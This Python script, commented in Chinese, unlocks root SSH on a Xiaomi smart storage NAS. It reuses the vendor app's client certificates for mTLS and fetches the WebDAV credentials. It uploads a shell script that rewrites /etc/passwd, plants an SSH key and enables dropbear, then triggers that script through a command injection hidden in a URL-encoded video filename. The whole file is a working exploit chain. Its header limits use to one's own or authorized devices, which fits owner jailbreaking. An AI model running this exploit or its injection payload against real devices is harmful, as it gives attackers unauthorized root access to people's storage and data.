#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
小米智能存储(minas) macOS 端：用 mTLS 获取 WebDAV 凭据并开启 Root SSH

背景：macOS 自带 curl(LibreSSL/SecureTransport) 不支持 Ed25519 客户端证书，
      所以用 Python ssl(OpenSSL 3.x) 完成 mTLS 握手（在 Apple Silicon / Intel 均可）。
      设备端 /etc/passwd / dropbear / RPMB 的改动逻辑见本脚本内联的 enable-ssh.sh。

用法：python3 enable-ssh-macos.py [NAS_IP]
环境变量(可选)：
  CERT_HOME  证书目录，默认自动定位到「小米智能存储.app」包内
  KEYF       SSH 私钥路径，默认 ~/.ssh/id_ed25519_minas

⚠️ 仅限本人/已授权设备。这是命令注入解锁，操作会改系统并可能失去保修。
"""
import sys, os, socket, ssl, json, base64, pathlib, subprocess, time

# ---------- 配置（替换为你自己的值） ----------
NAS_IP = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("NAS_IP", "192.168.31.100")
DEFAULT_CERT = "/Applications/小米智能存储.app/Contents/Resources/extraResources/cert"
CERT_DIR = os.environ.get("CERT_HOME", DEFAULT_CERT)
KEYF = os.environ.get("KEYF", os.path.expanduser("~/.ssh/id_ed25519_minas"))

def die(msg):
    print("错误：", msg); sys.exit(1)

CERT = pathlib.Path(CERT_DIR)
if not CERT.is_dir():
    die(f"找不到证书目录 {CERT}（请确认 Mac 已安装并登录「小米智能存储」）。")

cert_file = next((p for p in CERT.glob("*_cert.pem")), None)
key_file  = next((p for p in CERT.glob("*_private_key.pem")), None)
ca_file   = CERT / "ca_chain.pem"
if not (cert_file and key_file and ca_file.exists()):
    die(f"证书目录 {CERT} 下缺少 *_cert.pem / *_private_key.pem / ca_chain.pem")
print(f"[1/6] 证书目录：{CERT}")

_CN = None
def get_cn():
    """取设备服务端证书 CN（即设备域名）"""
    global _CN
    if _CN:
        return _CN
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.load_verify_locations(cafile=str(ca_file))
    ctx.check_hostname = False
    s = socket.create_connection((NAS_IP, 443), timeout=10)
    ss = ctx.wrap_socket(s, server_hostname="x")
    for rdn in ss.getpeercert().get("subject", ()):
        for k, v in rdn:
            if k == "commonName":
                _CN = v
    ss.close()
    if not _CN:
        die(f"无法获取 {NAS_IP}:443 的证书 CN")
    print(f"[2/6] 证书 CN：{_CN}")
    return _CN

def http_request(method, path, body=b"", port=5000, user="", pw=""):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.load_verify_locations(cafile=str(ca_file))
    ctx.load_cert_chain(certfile=str(cert_file), keyfile=str(key_file))
    ctx.check_hostname = True
    s = socket.create_connection((NAS_IP, port), timeout=12)
    ss = ctx.wrap_socket(s, server_hostname=get_cn())
    auth = ""
    if user:
        auth = "Authorization: Basic " + base64.b64encode(f"{user}:{pw}".encode()).decode() + "\r\n"
    req = (f"{method} {path} HTTP/1.1\r\n"
           f"Host: {get_cn()}:{port}\r\n{auth}"
           f"Content-Type: application/octet-stream\r\n"
           f"Content-Length: {len(body)}\r\n"
           f"Connection: close\r\n\r\n").encode()
    ss.sendall(req + body)
    resp = b""
    while True:
        b = ss.recv(8192)
        if not b:
            break
        resp += b
    ss.close()
    txt = resp.decode("utf-8", "replace")
    return " ".join(txt.split("\r\n")[:1]), txt.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in txt else ""

# ---------- 1. 取 WebDAV 凭据 ----------
status, bd = http_request("POST", "/cgi-bin/luci/filemgr/get_pool_info", b"{}", port=443)
if "200" not in status:
    die(f"get_pool_info 失败：{status}")
data = json.loads(bd[: bd.rfind("}") + 1])          # 去掉 chunked 尾部的残留数字
wd = data["data"]["webDAV"]
USER, PASS = wd["username"], wd["password"]
print(f"[3/6] WebDAV 账号：{USER}（端口 {wd['port']}）")

# ---------- 2. 生成 SSH 密钥 ----------
if not os.path.exists(KEYF):
    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", KEYF, "-C", "minas"], check=True)
pub = open(KEYF + ".pub").read().strip()
print(f"[4/6] SSH 密钥：{KEYF}")

# ---------- 3. 生成本地 enable-ssh.sh ----------
enable_sh = f"""#!/bin/sh
[ ! -f /etc/passwd.bak ] && cp /etc/passwd /etc/passwd.bak
mkdir -p /home/rootx/.ssh
echo "{pub}" > /home/rootx/.ssh/authorized_keys
chmod 700 /home/rootx/.ssh
chmod 600 /home/rootx/.ssh/authorized_keys
sed -i 's|:/root:|:/home/rootx:|' /etc/passwd
echo 'DROPBEAR_EXTRA_ARGS=" -s"' > /etc/default/dropbear
usermod -s /bin/sh root
systemctl enable dropbear.socket
systemctl start dropbear.socket
mitee_tool rpmb set ssh_en true
touch /nas/pool0/{{USER}}/data/SUCCESS
chown {{USER}}:{{USER}} /nas/pool0/{{USER}}/data/SUCCESS
rm -f /nas/pool0/{{USER}}/data/enable-ssh.sh
""".replace("\r\n", "\n")
open("/tmp/enable-ssh.sh", "w").write(enable_sh)

# ---------- 4. PUT 上传 ----------
status, _ = http_request("PUT", "/pool0/data/enable-ssh.sh", enable_sh.encode(), user=USER, pw=PASS)
if not any(c in status for c in ("200", "201", "204")):
    die(f"WebDAV PUT 失败：{status}")
print("[5/6] enable-ssh.sh 已上传")

# ---------- 5. 命令注入触发执行 ----------
eng = "/".join(["\\57nas", "\\57pool0", "\\57" + USER, "\\57data", "\\57enable-ssh.sh"])
trigger = "/pool0/video/__X2%22%3Bsh%20%24%28printf%20%27" + eng + "%27%29%3B%22__.ts"
status, _ = http_request("GET", trigger, user=USER, pw=PASS)
print("[6/6] 触发命令注入，HTTP " + status.split()[1] + "（预期 502/403）")
time.sleep(10)

# ---------- 6. 验证 ----------
print("=" * 50)
r = subprocess.run(["ssh", "-o", "ConnectTimeout=8", "-o", "StrictHostKeyChecking=accept-new",
                    "-o", "PasswordAuthentication=no", "-o", "BatchMode=yes",
                    "-i", KEYF, f"root@{NAS_IP}", "id"], capture_output=True, text=True)
print("🎉 SUCCESS！" if r.returncode == 0 else "❌ SSH 未就绪")
if r.returncode == 0:
    print(r.stdout.strip())
else:
    print(r.stderr.strip())
